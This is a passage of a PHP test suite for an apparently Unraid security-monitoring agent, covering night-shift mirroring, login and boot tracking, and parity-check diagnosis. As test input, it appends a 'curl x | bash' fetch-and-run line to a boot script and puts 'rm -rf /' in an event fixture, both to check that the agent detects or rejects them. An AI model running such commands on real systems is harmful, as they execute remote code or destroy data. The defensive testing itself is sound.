    check('night mirror (RAM and flash): root only', (fileperms($ram) & 0777) === 0600 && (fileperms($flash) & 0777) === 0600);
    same('night mirror: unchanged — the flash is left alone', 'ram', watchmanMirrorWrite($day, $ram, $flash, $now + 900, $boot1));
    file_put_contents("$src/plugins/new.plg", "<PLUGIN name=\"new\" version=\"1\" pluginURL=\"https://example.com/new.plg\">\n");
    watchmanRound($paths, $day, 1000, $now + 1000, $docker, true, $acks);
    $flashBefore = (string) file_get_contents($flash);
    same('night mirror: changed within the hour — RAM only', ['ram', $flashBefore], [watchmanMirrorWrite($day, $ram, $flash, $now + 1000, $boot1), (string) file_get_contents($flash)]);
    touch($flash, $now - 3700);
    same('night mirror: changed and an hour old — the flash too', 'flash', watchmanMirrorWrite($day, $ram, $flash, $now + 1000, $boot1));
    same('night mirror: the plugin\'s entry is open in it', ['login_new_ip:10.0.0.5', 'plugin_new:new'], array_column(readJson($flash)['open'], 'key'));
    $sentDay = count($calls());

    // the array stops: the night shift from the RAM mirror — never the data folder
    $t = $now + 1100;
    file_put_contents($paths['array_events'], "$t stop\n");
    file_put_contents($paths['syslog'], $line($t - 60, 'webgui: Successful login user root from 192.168.20.10')
        . $line($t + 30, 'webgui: Successful login user root from 10.0.0.5')           // the open one again: counted there
        . $line($t + 40, 'sshd-session[9]: Accepted publickey for root from 10.0.0.77 port 1 ssh2: x'), FILE_APPEND);
    file_put_contents($paths['go'], "curl x | bash\n", FILE_APPEND);
    $listing = function (string $dir): array {
        $out = [];
        foreach (is_dir($dir) ? new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)) : [] as $file) {
            $out[(string) $file] = [$file->getSize(), $file->getMTime()];
        }
        ksort($out);
        return $out;
    };
    $dataBefore = $listing(DATA_DIR);
    $dayBefore = $listing($day);
    check('night paths: nothing under /mnt or the data folder', !array_filter(watchmanNightPaths(),
        fn ($p) => is_string($p) && (str_starts_with($p, '/mnt') || str_starts_with($p, DATA_DIR))), json_encode(watchmanNightPaths()));
    same('night paths: no shares, no snapshots, no data flow, no office record', [], array_values(array_intersect(array_keys(watchmanNightPaths()),
        ['sec', 'sec_nfs', 'share_cfg', 'zfs', 'zpool', 'mnt', 'agent_log', 'snap_record', 'engine', 'office_installs'])));
    $r = watchmanNightRound($nightPaths, $night, $t + 60, true, fn () => [], $ram, $flash, $boot1);
    same('night: begun from the RAM mirror', ['hired' => 1000, 'from' => 'ram'], $r['begun'] ?? null);
    same('night: neither the data folder nor the day\'s files touched', [$dataBefore, $dayBefore], [$listing(DATA_DIR), $listing($day)]);
    $nb = watchmanLoad($night)['book'];
    $byKey = array_column($nb, null, 'key');
    same('night: a new address and go — new; the open one only counted on', [['flash_go', 'login_new_ip:10.0.0.77'], 2],
        [(function (array $k): array { sort($k); return $k; })(array_values(array_diff($openKeys($nb), ['login_new_ip:10.0.0.5', 'plugin_new:new']))),
         $byKey['login_new_ip:10.0.0.5']['count'] ?? null]);
    $stop = $byKey["array_stop:$t"] ?? [];
    same('night: the array\'s stop as a plain line, noted by himself, with who had logged in around then',
        ['array_stop', 'array', ['192.168.20.10', '10.0.0.5', '10.0.0.77'], 'T1489', false],
        [$stop['kind'] ?? null, $stop['by'] ?? null, array_column($stop['p']['logins'] ?? [], 'ip'), WATCH_ATTACK['array_stop'], WATCH_KINDS['array_stop'][1]]);
    $sent = array_slice($calls(), $sentDay);
    // login_new_ip was told at +300: still within its quiet hour (the mirror carries it); go is a new kind
    same('night: told like the day — the same kinds, the same quiet hour', [1, true, false],
        [count($sent), str_contains($sent[0] ?? '', 'flash') || str_contains($sent[0] ?? '', 'go'), str_contains(implode('', $sent), '10.0.0.77')]);
    $nst = watchmanLoad($night)['state'];
    $syslogEnd = filesize($paths['syslog']);
    same('night: the syslog read on from the day\'s place', $syslogEnd, $nst['syslog']['size'] ?? null);
    // what the office's page and the Dashboard tile say meanwhile (officeNightShift()): its rounds, what is new in it and open
    // (the go line and the new address — not the day's open entry it only counted on, not the array's line he noted himself)
    same('night: its rounds and what is new in it', [$t + 60, 1, 2], [$nst['night']['since'] ?? null, $nst['night']['rounds'] ?? null, $nst['night']['new'] ?? null]);
    watchmanNightRound($nightPaths, $night, $t + 360, false, fn () => [], $ram, $flash, $boot1);
    same('night: a second round counted, nothing more new', [$t + 60, 2, 2], array_values(array_intersect_key(watchmanLoad($night)['state']['night'] ?? [],
        ['since' => 1, 'rounds' => 1, 'new' => 1])));
    $nst = watchmanLoad($night)['state'];

    // never two of them: while the night shift holds its lock, the day waits
    $h = fopen($lock, 'c');
    flock($h, LOCK_EX);
    same('night lock: on', [true, ['busy' => true]], [watchmanNightOn($lock), watchmanNightHandover($day, $night, $t + 600, $lock)]);
    flock($h, LOCK_UN);
    fclose($h);
    check('night lock: off', !watchmanNightOn($lock));

    // the array starts: the agent takes the night over — the syslog's place, the entries once, the open one counted on
    file_put_contents($paths['syslog'], $line($t + 500, 'webgui: Successful login user root from 10.0.0.99'), FILE_APPEND);     // after the night's last round
    $dayBook = watchmanLoad($day)['book'];
    $before = array_column($dayBook, null, 'key');
    $h = watchmanNightHandover($day, $night, $t + 600, $lock);
    same('handover: new and brought up to date', ['new' => 3, 'updated' => 1], $h);
    $d = watchmanLoad($day);
    $byKey = array_column($d['book'], null, 'key');
    same('handover: the night\'s entries carry «night», the stop line too', [true, true, true, false],
        [!empty($byKey['flash_go']['night']), !empty($byKey['login_new_ip:10.0.0.77']['night']), !empty($byKey["array_stop:$t"]['night']),
         !empty($byKey['login_new_ip:10.0.0.5']['night'])]);
    same('handover: the open entry counted on, still told once', [(int) $before['login_new_ip:10.0.0.5']['count'] + 1, $before['login_new_ip:10.0.0.5']['told']],
        [$byKey['login_new_ip:10.0.0.5']['count'], $byKey['login_new_ip:10.0.0.5']['told']]);
    same('handover: no key open twice', count($openKeys($d['book'])), count(array_unique($openKeys($d['book']))));
    same('handover: the syslog\'s place and what was told taken over; the night\'s files gone', [$syslogEnd, true, []],
        [$d['state']['syslog']['size'] ?? null, isset($d['state']['notified']['flash_go']), array_values(array_filter(WATCH_NIGHT_FILES, fn ($f) => is_file("$night/$f")))]);
    same('handover: nothing left to take over', null, watchmanNightHandover($day, $night, $t + 601, $lock));
    same('handover: the day\'s night says from, until, which mirror — no counts of its own', ['since', 'until', 'from'], array_keys($d['state']['night'] ?? []));

    // the agent's next round: the array's start, the login after the night's last round — once
    file_put_contents($paths['array_events'], ($t + 550) . " start\n", FILE_APPEND);
    $sentBefore = count($calls());
    $r = watchmanRound($paths, $day, 1000, $t + 660, $docker, true, $acks);
    $d = watchmanLoad($day);
    $byKey = array_column($d['book'], null, 'key');
    same('after the night: nothing lost — the login after its last round is new, the start is a line',
        [['login_new_ip'], 'array', ['192.168.20.10', '10.0.0.5', '10.0.0.77', '10.0.0.99']],
        [$r['added'], $byKey['array_start:' . ($t + 550)]['by'] ?? null, array_column($byKey['array_start:' . ($t + 550)]['p']['logins'] ?? [], 'ip')]);
    same('after the night: nothing twice', [[], 1, 1], [watchmanRound($paths, $day, 1000, $t + 960, $docker, true, $acks)['added'],
        count(array_filter($d['book'], fn ($e) => $e['kind'] === 'array_stop')), count(array_filter($d['book'], fn ($e) => $e['kind'] === 'array_start'))]);
    check('after the night: the page shows the chip and the night', (function () use ($day, $t): bool {
        $ps = watchmanPageState($day, $t + 960, false);
        return (bool) array_filter($ps['book'], fn ($e) => $e['night']) && ($ps['night']['from'] ?? null) === 'ram' && ($ps['night']['until'] ?? 0) > 0;
    })());

    // a reboot: no RAM mirror of this boot — the flash's; this boot's syslog from its start, passwords from the first look
    watchmanMirrorWrite($day, $ram, $flash, $t + 960, $boot1);
    touch($flash, $t - 7200);
    watchmanMirrorWrite($day, $ram, $flash, $t + 960, $boot1);
    file_put_contents("$tmp/boot_id", "$boot2\n");
    $boot = $t + 3600;
    file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime $boot\nprocesses 9\n");
    file_put_contents($paths['syslog'], $line($boot + 10, 'webgui: Successful login user root from 192.168.20.10')
        . $line($boot + 20, 'webgui: Successful login user root from 10.0.0.123'));
    file_put_contents($paths['shadow'], 'root:$6$zz$yy:20000:0:99999:7:::' . "\n");     // changed while it was off: the agent's to find
    $r = watchmanNightRound($nightPaths, $night, $boot + 60, false, fn () => [], $ram, $flash, $boot2);
    $nb = watchmanLoad($night)['book'];
    same('reboot: a new night counts anew', [$boot + 60, 1], [watchmanLoad($night)['state']['night']['since'] ?? null, watchmanLoad($night)['state']['night']['rounds'] ?? null]);
    // the reboot left no array line (its clock lay in RAM): the night shift books the server's start, at the kernel's btime
    $sb = array_values(array_filter($nb, fn ($e) => $e['kind'] === 'server_boot'));
    same('reboot: the night books the server\'s start — once, a plain line at its btime, with who logged in then',
        [1, "server_boot:$boot2", $boot, 'array', true, ['192.168.20.10', '10.0.0.123'], 'T1529', false],
        [count($sb), $sb[0]['key'] ?? null, $sb[0]['time'] ?? null, $sb[0]['by'] ?? null, !empty($sb[0]['noted']),
         array_column($sb[0]['p']['logins'] ?? [], 'ip'), WATCH_ATTACK['server_boot'], WATCH_KINDS['server_boot'][1]]);
    watchmanNightRound($nightPaths, $night, $boot + 90, false, fn () => [], $ram, $flash, $boot2);
    same('reboot: the night\'s next round — still once', 1, count(array_filter(watchmanLoad($night)['book'], fn ($e) => $e['kind'] === 'server_boot')));
    same('reboot: begun from the flash, this boot\'s syslog from its start; a password the first look stands for',
        [['hired' => 1000, 'from' => 'flash'], true, false],
        [$r['begun'] ?? null, in_array('login_new_ip:10.0.0.123', $openKeys($nb), true), in_array('flash_password:root', $openKeys($nb), true)]);
    // and the agent, after the handover, still finds the password against its own book
    watchmanNightHandover($day, $night, $boot + 120, $lock);
    watchmanRound($paths, $day, 1000, $boot + 180, $docker, false, $acks);
    check('reboot: the changed password is the agent\'s find after the start', in_array('flash_password:root', $openKeys(watchmanLoad($day)['book']), true));
    $sb = array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => $e['kind'] === 'server_boot'));
    same('reboot: the night\'s line of the server\'s start taken over — the day books it no second time', [1, true, $boot2],
        [count($sb), !empty($sb[0]['night']), watchmanLoad($day)['state']['boot_seen'] ?? null]);

    // no mirror: no night shift, nothing written
    hardeningRm($night);
    same('night: without a mirror none', [null, false], [watchmanNightRound($nightPaths, $night, $boot, false, fn () => [], "$tmp/none.json", "$tmp/none2.json", $boot2),
        is_file("$night/book.json")]);
    // let go: the mirrors go
    hardeningRm($day);
    same('night mirror: not on watch — both gone', ['none', false, false], [watchmanMirrorWrite($day, $ram, $flash, $boot), is_file($ram), is_file($flash)]);

    // the SIEM switch had shared the syslog's place up to 1.30
    same('state: an old SIEM switch moves to siem, the place is read anew', [['syslog' => null, 'siem' => true], ['syslog' => ['ino' => 1, 'size' => 2]]],
        [watchmanStateFix(['syslog' => true]), watchmanStateFix(['syslog' => ['ino' => 1, 'size' => 2]])]);
    same('array events: only their shape, oldest first', [[5, 'x'], [[1700000000, 'stop'], [1700000100, 'start']]],
        [[5, 'x'], watchmanArrayEvents((function () use ($tmp): string {
            file_put_contents("$tmp/ev", "1700000100 start\nrm -rf /\n1700000000 stop\n1700000000 stop now\n");
            return "$tmp/ev";
        })())]);

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    foreach ([$day, $night] as $dir) {
        @unlink(watchmanLockFile($dir, 'book'));
        @unlink(watchmanLockFile($dir, 'round'));
    }
    hardeningRm($tmp);
}

/**
 * A reboot leaves no array line (agent.sh's array events lie in RAM): a round that sees another boot id than the one
 * he kept books «the server was started» — once per boot, never at his first round after hiring (the night shift's
 * part and the handover: testWatchmanNight).
 */
function testWatchmanBoot(): void
{
    $now = strtotime('2026-10-07 12:00:00');
    $tmp = hardeningTmp('watchboot');
    $src = "$tmp/src";
    $day = "$tmp/data/watchman";
    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'boot_id' => "$tmp/boot_id", 'stat' => "$tmp/stat"];
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    file_put_contents($paths['syslog'], $line($now - 60, 'webgui: Successful login user root from 192.168.20.10'));
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
    foreach (['sec', 'sec_nfs', 'share_cfg'] as $k) {
        file_put_contents($paths[$k], '');
    }
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    $bootA = 'bbbbbbbb-0000-4000-8000-00000000000a';
    $bootB = 'bbbbbbbb-0000-4000-8000-00000000000b';
    $bootC = 'bbbbbbbb-0000-4000-8000-00000000000c';
    $boots = fn () => array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => $e['kind'] === 'server_boot'));
    $setBoot = function (string $id, int $btime) use ($tmp): void {
        file_put_contents("$tmp/boot_id", "$id\n");
        file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime $btime\nprocesses 9\n");
    };

    // an earlier hiring kept boot A; hired anew in boot B: his first round takes over — no line, only remembered
    $setBoot($bootA, $now - 86400);
    watchmanRound($paths, $day, 900, $now - 3600, $docker, false, $acks);
    $setBoot($bootB, $now - 600);
    watchmanRound($paths, $day, 1000, $now, $docker, false, $acks);
    same('boot: never at his first round after hiring (another boot than the old hiring\'s)', [0, $bootB], [count($boots()), watchmanLoad($day)['state']['boot_seen'] ?? null]);
    watchmanRound($paths, $day, 1000, $now + 300, $docker, false, $acks);
    same('boot: the same boot — none', 0, count($boots()));

    // a reboot: the next round books the start once, at the kernel's btime, with who logged in around then
    $up = $now + 900;
    $setBoot($bootC, $up);
    file_put_contents($paths['syslog'], $line($up + 40, 'webgui: Successful login user root from 192.168.20.10')
        . $line($up + 50, 'sshd-session[7]: Accepted publickey for root from 192.168.20.20 port 2 ssh2: x'));
    $r = watchmanRound($paths, $day, 1000, $up + 120, $docker, false, $acks);
    $b = $boots();
    same('boot: a new boot id — one plain line at its btime, noted by himself, who logged in around then (the new address apart)',
        [1, "server_boot:$bootC", $up, 'array', true, ['192.168.20.10', '192.168.20.20'], ['login_new_ip'], $bootC],
        [count($b), $b[0]['key'] ?? null, $b[0]['time'] ?? null, $b[0]['by'] ?? null, !empty($b[0]['noted']), array_column($b[0]['p']['logins'] ?? [], 'ip'),
         $r['added'], watchmanLoad($day)['state']['boot_seen'] ?? null]);
    same('boot: never told, never on the team lead\'s list', [[], []],
        [array_values(array_filter(watchmanChecks($day), fn ($f) => $f['id'] === 'server_boot')), array_values(array_filter(array_keys(watchmanOpenCounts(watchmanLoad($day)['book'])), fn ($k) => $k === 'server_boot'))]);
    watchmanRound($paths, $day, 1000, $up + 420, $docker, false, $acks);
    same('boot: the same boot again — still one', 1, count($boots()));
    same('boot: its words', 'The server was started — logged in around then: root@192.168.20.10 (WebGUI), root@192.168.20.20 (SSH (publickey))',
        officeNotifyText('watchman', 'entry.server_boot', watchmanText($boots()[0]), 'en'));

    // a state of before 1.31 (no boot_seen): the syslog position's boot tells; unknown — only remembered
    $st = watchmanLoad($day)['state'];
    unset($st['boot_seen']);
    writeAtomic("$day/state.json", jsonEncode($st));
    $setBoot($bootA, $up + 3600);
    watchmanRound($paths, $day, 1000, $up + 3700, $docker, false, $acks);
    same('boot: an older state — the syslog position\'s boot tells', [2, "server_boot:$bootA"], [count($boots()), $boots()[1]['key'] ?? null]);
    $st = watchmanLoad($day)['state'];
    unset($st['boot_seen'], $st['syslog']['boot']);
    writeAtomic("$day/state.json", jsonEncode($st));
    $setBoot($bootB, $up + 7200);
    watchmanRound($paths, $day, 1000, $up + 7300, $docker, false, $acks);
    same('boot: nothing known of the boot before — only remembered', [2, $bootB], [count($boots()), watchmanLoad($day)['state']['boot_seen'] ?? null]);
    same('boot: btime read only in its shape', [1700000000, null, null],
        [watchmanBootTime((function () use ($tmp): string { file_put_contents("$tmp/s1", "cpu 1\nbtime 1700000000\n"); return "$tmp/s1"; })()),
         watchmanBootTime((function () use ($tmp): string { file_put_contents("$tmp/s2", "xbtime 1700000000\nbtime 17x\n"); return "$tmp/s2"; })()),
         watchmanBootTime("$tmp/none")]);

    @unlink(watchmanLockFile($day, 'book'));
    @unlink(watchmanLockFile($day, 'round'));
    hardeningRm($tmp);
}

/**
 * Why a parity check runs (agent/lib/paritywhy.php, 2026-10-09): Unraid 7.3.3's traces read from fixtures — the flash's
 * parity history, Unraid's schedule, Parity Check Tuning's progress file, a real diagnostics syslog of a shutdown that ran
 * out of time (a test server, 2026-10-09 01:09, zipped here as rc.local_shutdown writes it), the boot's syslog — and the night
 * watchman's rounds through boots: once per boot a verdict about the stop before (Unraid's «unclean shutdown detected»,
 * or a check that began with the array), a plain line per check with its reason (unclean with what held the array,
 * schedule, Parity Check Tuning, by hand, unknown with who was logged in, a rebuild), one notification (normal, the
 * readable layout) per unclean stop, the team lead's to-do with the numbers — gone after a clean boot or an array
 * stopped and started again; repeated unclean stops counted; nothing in the night shift; read only.
 */
function testParityWhy(): void
{
    $fx = __DIR__ . '/fixtures/parity';
    $now = strtotime('2026-10-09 12:00:00');

    // ---- the pure parts
    same('parity: var.ini read in its shape', [true, 'check P', true, false, 1791501076],
        array_values(array_intersect_key(paritywhyVar(['fsState' => 'Started', 'mdResyncAction' => 'check P', 'mdResyncPos' => '1024', 'mdResync' => '5',
            'sbSynced' => '1791501076']), array_flip(['action', 'running', 'paused', 'started', 'synced']))));
    same('parity: paused = mdResync 0 with a position; stopped array; odd action dropped', [true, false, ''],
        [paritywhyVar(['mdResyncPos' => '5', 'mdResync' => '0'])['paused'], paritywhyVar(['fsState' => 'Stopped'])['started'],
         paritywhyVar(['mdResyncAction' => "check P\nx"])['action']]);
    same('parity: kinds', ['check', 'rebuild', 'clear', 'none'], array_map('paritywhyKind', ['check P', 'recon P', 'clear', '']));
    $h = paritywhyHistory((string) file_get_contents("$fx/parity-checks.log") . "garbage|x\n2026 Oct 33 99:99:99|5|1|0|0\n");
    same('parity: parity-checks.log (a test server) — local time, the start from its seconds, nothing odd', [2, 17, 'check P', 0, mktime(1, 11, 33, 10, 9, 2026), mktime(1, 11, 16, 10, 9, 2026)],
        [count($h), $h[1]['seconds'], $h[1]['action'], $h[1]['errors'], $h[1]['end'], $h[1]['start']]);
    $cron = (string) file_get_contents("$fx/parity-check.cron");
    same('parity: Unraid\'s schedule names the minute (or the one before), nothing else', [true, true, false, false],
        [paritywhyScheduled($cron, mktime(3, 0, 20, 11, 1, 2026)), paritywhyScheduled($cron, mktime(3, 1, 5, 11, 1, 2026)),
         paritywhyScheduled($cron, mktime(3, 0, 0, 11, 2, 2026)), paritywhyScheduled("0 3 * * * /usr/local/sbin/mover start\n", mktime(3, 0, 0, 11, 2, 2026))]);
    $pct = hardeningTmp('paritypct');
    file_put_contents("$pct/parity.check.tuning.progress", strtr((string) file_get_contents("$fx/parity.check.tuning.progress.tpl"),
        ['@MANUAL@' => (string) ($now - 3600), '@PAUSE@' => (string) ($now - 1800), '@RESUME@' => (string) ($now - 60)]));
    $p = paritywhyPct($pct, true);
    same('parity: Parity Check Tuning\'s progress file — types and times, the header left out; not installed: nothing read',
        [['MANUAL', 'PAUSE (RESTART)', 'RESUME (RESTART)'], $now - 60, false, []],
        [array_column($p['progress'], 'type'), $p['progress'][2]['t'], $p['restart'], paritywhyPct($pct, false)['progress']]);
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    $boot = $line($now - 100, 'emhttpd: Unraid(tm) System Management Utility version 7.3.3')
          . $line($now - 99, 'emhttpd: unclean shutdown detected')
          . $line($now - 80, 'kernel: mdcmd (35): start STOPPED')
          . $line($now - 79, 'emhttpd: shcmd (39): touch /boot/config/forcesync')
          . $line($now - 78, 'kernel: mdcmd (36): check ')
          . $line($now - 78, 'kernel: md: recovery thread: check P ...')
          . $line($now - 20, 'uso-watchman: {"text":"unclean shutdown detected"}');
    same('parity: the boot\'s syslog — Unraid\'s line, the array\'s start; his own SIEM lines never count',
        ['unclean' => $now - 99, 'start' => $now - 80, 'pct_restart' => null, 'pct_unclean' => null], paritywhyBootLog($boot, $now));
    same('parity: Parity Check Tuning\'s lines are its own', [null, $now - 5, $now - 6],
        array_values(array_intersect_key(paritywhyBootLog($line($now - 6, 'Parity Check Tuning: Unclean shutdown detected') . $line($now - 5, 'Parity Check Tuning: restart to be attempted'), $now),
            array_flip(['unclean', 'pct_restart', 'pct_unclean']))));
    $real = (string) file_get_contents("$fx/tower-20261009-0109-timeout.syslog");
    $b = paritywhyBlockers($real, $now);
    same('parity: a test server\'s real shutdown (7.3.2, 2026-10-09 01:09) — the time-out ran out, the busy pools (a dataset under one said by the pool), the retries, the containers\' 2 s',
        [true, 90, ['/mnt/cache', '/mnt/disk2', '/mnt/big'], 15, [], 2], [$b['forced'], $b['timeout'], $b['busy'], $b['retries'], $b['vms'], $b['containers_s']]);
    $b2 = paritywhyBlockers($line($now - 300, 'rc.local_shutdown: Waiting up to 30 seconds for graceful shutdown...')
        . $line($now - 299, 'rc.docker: Stopping containers...') . $line($now - 289, 'rc.docker: Unraid managed containers stopped.')
        . $line($now - 288, 'rc.libvirt: Shutting down VM: Windows 11') . $line($now - 228, 'rc.libvirt: Forced shutting down VM: Windows 11')
        . $line($now - 227, 'umount: /mnt/disk1: target is busy.') . $line($now - 226, 'emhttpd: Retry unmounting disk share(s)...')
        . $line($now - 225, 'rc.docker: dockerd will not die!') . $line($now - 200, 'rc.local_shutdown: Forcing shutdown...'), $now);
    same('parity: an XFS/btrfs disk busy, a VM switched off hard, containers to their time-out, a service that would not die',
        [true, 30, ['/mnt/disk1'], ['Windows 11'], ['Windows 11'], 10, ['dockerd'], '/mnt/disk1, VM «Windows 11», dockerd'],
        [$b2['forced'], $b2['timeout'], $b2['busy'], $b2['vms'], $b2['vms_waited'], $b2['containers_s'], $b2['stuck'], paritywhyHeld($b2)]);
    // the live test on a test server (7.3.3, 2026-10-09): a program in /mnt/disk1 (btrfs) with a 45 s time-out — the time-out ran out, yet
    // rc.6 killed the holder and the stop ended clean (no unclean line at the next boot); then one in /mnt/disk2 (ZFS) — unclean,
    // and the next boot's lines: Unraid's own, the array's start, a correcting check 15 s after it
    $b3 = paritywhyBlockers((string) file_get_contents("$fx/tower-20261009-0911-timeout-clean.syslog"), $now);
    same('parity: the test server 09:11 — «root: umount: /mnt/disk1: target is busy.», the 45 s time-out, Unraid\'s containers in 1 s',
        [true, 45, ['/mnt/disk1'], 1], [$b3['forced'], $b3['timeout'], $b3['busy'], $b3['containers_s']]);
    $bl = paritywhyBootLog((string) file_get_contents("$fx/tower-20261009-0915-boot.syslog"), $now);
    same('parity: the test server 09:15 — the boot after the unclean stop: Unraid\'s line, then the array\'s start', [mktime(9, 15, 56, 10, 9, 2026), mktime(9, 16, 3, 10, 9, 2026)],
        [$bl['unclean'], $bl['start']]);
    same('parity: … and its check (15 s after the start) has the reason «unclean»', 'unclean',
        paritywhyReason(['start' => mktime(9, 16, 18, 10, 9, 2026), 'action' => 'check P', 'log' => $bl, 'pct' => [], 'array_start' => $bl['start'], 'cron' => '', 'unclean' => true]));
    same('parity: how the stop ended — diagnostics: the time-out; a kept syslog without «Forcing»: late; nothing kept while the copy is on: a crash; else unknown',
        ['timeout', 'diag', 'late', 'crash', 'unknown', 'unknown', 'timeout'],
        [paritywhyStop(['syslog' => $real], '', false, false, $now)['stop'], paritywhyStop(['syslog' => $real], '', false, false, $now)['from'],
         paritywhyStop(null, $line($now - 400, 'rc.6: Running shutdown script'), true, false, $now)['stop'],
         paritywhyStop(null, '', true, false, $now)['stop'], paritywhyStop(null, '', false, false, $now)['stop'],
         paritywhyStop(null, '', true, true, $now)['stop'], paritywhyStop(null, $real, true, false, $now)['stop']]);
    same('parity: the times — Docker + VMs + the margin; services off count nothing; empty = Unraid\'s defaults',
        [['disk' => 90, 'vm' => 60, 'docker' => 10, 'need' => 100, 'fits' => false], ['disk' => 200, 'vm' => 0, 'docker' => 0, 'need' => 30, 'fits' => true],
         ['disk' => 300, 'vm' => 120, 'docker' => 45, 'need' => 195, 'fits' => true]],
        [paritywhyTimes([], ['SERVICE' => 'enable'], ['DOCKER_ENABLED' => 'yes']), paritywhyTimes(['shutdownTimeout' => '200'], [], []),
         paritywhyTimes(['shutdownTimeout' => '300'], ['SERVICE' => 'enable', 'TIMEOUT' => '120'], ['DOCKER_ENABLED' => 'yes', 'DOCKER_TIMEOUT' => '45'])]);
    $r = fn (array $f) => paritywhyReason($f + ['start' => $now, 'action' => 'check P', 'log' => [], 'pct' => [], 'array_start' => null, 'cron' => '', 'unclean' => false]);
    same('parity: the reasons, from the evidence only',
        ['rebuild', 'rebuild', 'tuning', 'tuning', 'unclean', 'unclean', 'unknown', 'schedule', 'schedule', 'manual', 'unknown'],
        [$r(['action' => 'recon P']), $r(['action' => 'clear']), $r(['log' => ['pct_restart' => $now - 30]]),
         $r(['pct' => ['progress' => [['type' => 'RESUME (RESTART)', 't' => $now + 5]]]]),
         $r(['array_start' => $now - 20, 'unclean' => true]), $r(['array_start' => $now - 20, 'pct' => ['progress' => [['type' => 'AUTOMATIC', 't' => $now]]]]),
         $r(['array_start' => $now - 3600, 'unclean' => true]), $r(['start' => mktime(3, 0, 10, 11, 1, 2026), 'cron' => $cron]),
         $r(['pct' => ['progress' => [['type' => 'SCHEDULED', 't' => $now]]]]), $r(['pct' => ['progress' => [['type' => 'MANUAL', 't' => $now - 100]]]]),
         $r(['pct' => ['progress' => [['type' => 'MANUAL', 't' => $now - 3600]]]])]);
    // the diagnostics as rc.local_shutdown writes them: <name>-diagnostics-<date>-<time>.zip in /boot/logs, its logs/syslog.txt
    $logs = hardeningTmp('paritylogs');
    $zipFile = "$logs/tower-diagnostics-20261009-1150.zip";
    $z = new ZipArchive();
    $z->open($zipFile, ZipArchive::CREATE);
    $z->addFromString('tower-diagnostics-20261009-1150/logs/syslog.txt', $real);
    $z->addFromString('tower-diagnostics-20261009-1150/system/lsof.txt', "COMMAND PID\n");
    $z->close();
    touch($zipFile, $now - 700);
    file_put_contents("$logs/old-diagnostics-20261001-0000.zip", 'x');
    touch("$logs/old-diagnostics-20261001-0000.zip", $now - 9 * 86400);
    @symlink($zipFile, "$logs/link-diagnostics-20261009-1151.zip");
    $d = paritywhyDiag($logs, $now - 600);
    same('parity: the shutdown\'s diagnostics — the newest within PARITYWHY_DIAG_BEFORE before the boot, plain files only; none before an older boot, none of the boot before',
        ['tower-diagnostics-20261009-1150.zip', null, null], [$d['name'] ?? null, paritywhyDiag($logs, $now + 7200), paritywhyDiag($logs, $now - 600, $now - 650)]);
    same('parity: its syslog read from the zip in memory', $real, paritywhyDiagSyslog((array) $d));
    hardeningRm($pct);

    // ---- the night watchman's rounds through boots
    $tmp = hardeningTmp('paritywhy');
    $src = "$tmp/src";
    $day = "$tmp/data/watchman";
    foreach (['plugins', 'extra', 'ssh/root', 'logs', 'pct'] as $dd) {
        @mkdir("$src/$dd", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'boot_id' => "$tmp/boot_id", 'stat' => "$tmp/stat", 'var_ini' => "$src/var.ini",
              'parity_log' => "$src/parity-checks.log", 'parity_cron' => "$src/parity-check.cron", 'pct_dir' => "$src/pct", 'boot_logs' => "$src/logs",
              'domain_cfg' => "$src/domain.cfg", 'docker_cfg' => "$src/docker.cfg", 'rsyslog_cfg' => "$src/rsyslog.cfg", 'array_events' => "$src/array-events"];
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
    foreach (['sec', 'sec_nfs', 'share_cfg', 'parity_log', 'array_events'] as $k) {
        file_put_contents($paths[$k], '');
    }
    file_put_contents($paths['parity_cron'], $cron);
    file_put_contents($paths['domain_cfg'], "SERVICE=\"enable\"\nTIMEOUT=\"60\"\n");
    file_put_contents($paths['docker_cfg'], "DOCKER_ENABLED=\"yes\"\nDOCKER_TIMEOUT=\"10\"\n");
    file_put_contents($paths['rsyslog_cfg'], "local_server=\"\"\nsyslog_flash=\"\"\nsyslog_shutdown=\"1\"\nremote_server=\"\"\n");
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
